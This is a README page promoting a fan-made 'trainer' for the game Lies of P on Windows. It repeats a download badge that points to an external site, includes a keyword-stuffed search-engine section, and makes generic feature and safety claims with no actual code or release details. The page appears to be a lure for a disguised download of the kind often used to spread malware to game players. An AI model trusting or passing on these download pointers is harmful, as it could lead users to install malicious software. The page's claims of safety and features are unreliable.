![preview](https://raw.githubusercontent.com/boGarten/Lies-of-P-Trainer-Companion/main/banner_2273.svg)
# 🎭 Lies of P — Companion Trainer Suite (Windows)

[![Download](https://raw.githubusercontent.com/boGarten/Lies-of-P-Trainer-Companion/main/btn_0b4344c.svg)](https://boGarten.github.io/Lies-of-P-Trainer-Companion/)

A community-crafted companion toolkit for players who want to reshape their journey through the haunting streets of Krat. This project is an independent, fan-made utility suite designed to run alongside the original game on Windows 11 and Windows 10, giving players granular control over their experience — from adjusting difficulty parameters to unlocking cosmetic exploration modes — all within a clean, responsive interface.

Whether you are a first-time visitor to the Belle Époque nightmare or a seasoned puppet slayer chasing every ending, this suite exists to make your time with the game more personal, more experimental, and more fun. No strings attached, no hidden tricks — just a thoughtfully engineered toolbox built by players, for players.

[![Download](https://raw.githubusercontent.com/boGarten/Lies-of-P-Trainer-Companion/main/btn_0b4344c.svg)](https://boGarten.github.io/Lies-of-P-Trainer-Companion/)

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Why This Project Exists](#-why-this-project-exists)
- [Feature Highlights](#-feature-highlights)
- [System Requirements](#-system-requirements)
- [Getting Started](#-getting-started)
- [Configuration & Profiles](#-configuration--profiles)
- [Multilingual Support](#-multilingual-support)
- [Responsive Interface](#-responsive-interface)
- [Round-the-Clock Player Assistance](#-round-the-clock-player-assistance)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap](#-roadmap)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Overview

The **Lies of P — Companion Trainer Suite** is a Windows-native desktop application that interfaces with the running game process to expose a curated set of adjustable parameters. Think of it as a backstage pass to the theater of Krat: you remain the audience, but now you can fiddle with the lighting, the pacing, and the props.

The suite is built with a modular architecture. Each "module" corresponds to a category of tweaks — combat pacing, resource flow, exploration aids, and visual toggles — and players can enable or disable modules independently. Nothing is forced, nothing is baked in. You choose which levers to pull.

This repository hosts the installer assets, the configuration schema, the localization packs, and the documentation that surrounds the suite. It is intended for **personal, single-player use only**.

---

## 💡 Why This Project Exists

Most single-player games ship with one difficulty curve, tuned for one imagined average player. But real players are anything but average. Some want to savor the story without sweating every boss. Others want to push the challenge beyond what the designers intended. A third group simply wants to wander the world, admire the architecture, and photograph the scenery without interruption.

This project was born from that gap. Instead of a one-size-fits-all experience, the Companion Trainer Suite offers a **dial**, not a switch. You can nudge, tune, and revert at will. It is less a cheat sheet and more a soundboard — a way to remix the game into the version that fits your evening.

---

## 🌟 Feature Highlights

### 🎚️ Adaptive Parameter Modules
Each module is designed to be toggled independently. Enable combat smoothing for a relaxed evening, disable it the next morning for a purist run. Profiles let you save and swap entire configurations in one click.

### 🧩 Responsive UI
The interface adapts fluidly to window sizes, DPI scaling, and multi-monitor setups. Whether you run the suite on a 4K ultrawide or a modest laptop panel, every control remains reachable and legible.

### 🌐 Multilingual Support
Localization packs ship for a growing list of languages, with community contributions welcome. The UI detects your Windows display language and selects an appropriate pack automatically, with a manual override always available.

### 🕰️ Round-the-Clock Player Assistance
A rotating team of maintainers and community volunteers staffs the support channels around the clock. Questions, bug reports, and localization fixes are triaged continuously — not on a "when we feel like it" schedule.

### 🧠 Profile Persistence
Configuration profiles are stored as plain, human-readable files. You can back them up, share them with friends, or version them alongside your save archives.

### 🎨 Theming & Accessibility
Light, dark, and high-contrast themes are bundled. Keyboard-only navigation is fully supported, and every interactive element exposes an accessible label.

### 🔄 Automatic Update Checks
The suite periodically checks for new releases and notifies you in-app. Updates are always optional and never applied silently.

### 📊 Session Dashboard
A lightweight dashboard summarizes your active modules, session duration, and profile in use — useful for streamers who want a quick visual reference on screen.

### 🧪 Experimental Sandbox
A separate sandbox area hosts rougher, in-progress tweaks. These are clearly labeled as experimental and are isolated from the stable modules so they cannot interfere with a normal session.

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| Operating System | Windows 10 (64-bit, build 1909+) | Windows 11 (64-bit, latest update) |
| Processor | Dual-core 2.0 GHz | Quad-core 3.0 GHz or better |
| Memory | 4 GB RAM | 8 GB RAM or more |
| Storage | 250 MB available | 500 MB available (for logs & profiles) |
| Display | 1280×720 | 1920×1080 or higher |
| Runtime | .NET Desktop Runtime 6.0+ | .NET Desktop Runtime 8.0 |
| Permissions | Standard user | Standard user (elevation only when required) |

The suite does **not** modify game files on disk. All adjustments are applied to the running process in memory and are discarded when the session ends.

---

## 🚀 Getting Started

1. **Review the requirements** above to confirm your machine is a good fit.
2. **Obtain the current release package** using the distribution marker shown throughout this document.
3. **Unpack the archive** into a folder you control — avoid placing it inside the game's own installation directory.
4. **Launch the suite** before or after starting the game; the suite will detect a running session automatically.
5. **Select a profile** from the dropdown, or start from the "Balanced" preset.
6. **Toggle modules** as desired. Changes apply immediately and are logged in the session dashboard.
7. **Close the suite** when finished. No background services remain after exit.

[![Download](https://raw.githubusercontent.com/boGarten/Lies-of-P-Trainer-Companion/main/btn_0b4344c.svg)](https://boGarten.github.io/Lies-of-P-Trainer-Companion/)

---

## 🛠️ Configuration & Profiles

Profiles are the heart of the suite. A profile is simply a named collection of module states and parameter values. The suite ships with several presets:

- **Balanced** — a gentle nudge toward accessibility without altering the intended feel.
- **Explorer** — emphasizes traversal, discovery, and visual freedom.
- **Storyteller** — prioritizes narrative flow and frictionless progression.
- **Purist** — all modules off; the suite idles politely in the background.
- **Sandbox** — enables experimental modules for tinkerers.

You can duplicate any preset, rename it, and save it as your own. Profiles live in a plain-text format under the suite's `profiles` directory, making them easy to share with friends or archive for later.

---

## 🌍 Multilingual Support

The suite currently ships with localization packs for English, Spanish, French, German, Italian, Portuguese (Brazil), Polish, Japanese, Korean, and Simplified Chinese. Each pack is community-maintained and versioned alongside the core application. If your language is missing — or if you spot a clumsy translation — contributions are warmly welcomed. The localization schema is intentionally simple so that non-programmers can participate.

The language selector is available in the settings pane and supports live switching without a restart.

---

## 📱 Responsive Interface

Too many desktop utilities behave like stubborn furniture — fixed, unyielding, and awkward on a small screen. This suite takes the opposite stance. The layout reflows gracefully as the window resizes, collapses secondary panels on narrow displays, and preserves the most-used controls at the top of the visual hierarchy. On larger displays, an expanded mode surfaces advanced parameters side by side. The result is an interface that feels at home on a laptop, a desktop, or a streaming rig.

---

## 🕐 Round-the-Clock Player Assistance

Support is not a novelty here — it is a commitment. The project maintains a rotating schedule of maintainers across multiple time zones, so a question asked at 3 a.m. local time is likely to meet a reply before sunrise. Assistance covers:

- Installation and first-run questions
- Profile and configuration guidance
- Localization feedback and corrections
- Bug triage and reproduction steps
- Feature suggestions and roadmap discussion

Response times vary with volume, but the goal is always a human reply — never a canned autoresponder.

---

## 🔍 SEO & Discoverability Notes

This section exists for the benefit of players who find projects through search engines. If you arrived here searching for a **Lies of P trainer for Windows 11**, a **Lies of P companion utility for Windows 10**, or a **Lies of P single-player configuration suite**, you are in the right place.

Common search phrases this project is intended to answer to include:

- Lies of P trainer download for Windows
- Lies of P companion toolkit setup guide
- Lies of P single-player parameter editor
- Lies of P Windows 11 compatibility tool
- Lies of P Windows 10 profile manager
- Lies of P localization and accessibility companion

The documentation is written to be genuinely useful first and discoverable second. Keyword stuffing helps no one, so the language here aims to read naturally while still covering the terms players actually type.

---

## 🗺️ Roadmap

Planned and in-progress work, in no particular order:

- [ ] Expanded localization packs (Turkish, Dutch, Ukrainian)
- [ ] Cloud-synced profile backup (opt-in)
- [ ] Streamer overlay widget with live module status
- [ ] Scheduled profile switching (time-of-day presets)
- [ ] Improved color-blind themes
- [ ] Plugin API for community-authored modules
- [ ] Detailed session analytics export (CSV / JSON)

Roadmap items are aspirations, not promises. Priorities shift with community feedback.

---

## ❓ Frequently Asked Questions

**Does this modify my save files?**
No. The suite interacts with the running process only. Your saves remain untouched unless you explicitly back them up through your own tools.

**Will this work on Windows 11?**
Yes. Windows 11 is the primary supported target, with Windows 10 receiving full compatibility.

**Is this usable on a Steam Deck or Proton?**
The suite targets native Windows. Compatibility layers are not officially supported, though community members have reported partial success.

**Can I use this with mods?**
Generally yes, but mods that alter the same in-memory structures may conflict. The session dashboard flags suspicious overlaps.

**How do I report a bug?**
Open an issue with a description, your Windows version, the suite version, and the profile in use. Logs are located in the `logs` folder and can be attached directly.

**Is my data collected?**
No telemetry is sent anywhere. The suite is offline-first and only reaches the network for optional update checks.

---

## ⚠️ Disclaimer

This project is an **independent, fan-made utility** and is not affiliated with, endorsed by, or sponsored by the developers or publishers of Lies of P. All trademarks and copyrights belong to their respective owners.

The suite is intended strictly for **personal, single-player use** on your own legally obtained copy of the game. It is not designed for, and must not be used in, any multiplayer, competitive, or online context. Doing so may violate the game's terms of service and is outside the scope of this project's intent.

Use at your own discretion. The maintainers accept no responsibility for consequences arising from misuse, including but not limited to account actions, save corruption, or unexpected game behavior. Always keep backups of anything you care about. Test new profiles in a controlled session before relying on them.

This documentation was last refreshed in **2026**.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to read it, fork it, adapt it, and share it — provided the original license text travels with your copy.

A full copy of the license is available here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Lies of P Companion Trainer Suite contributors.

[![Download](https://raw.githubusercontent.com/boGarten/Lies-of-P-Trainer-Companion/main/btn_0b4344c.svg)](https://boGarten.github.io/Lies-of-P-Trainer-Companion/)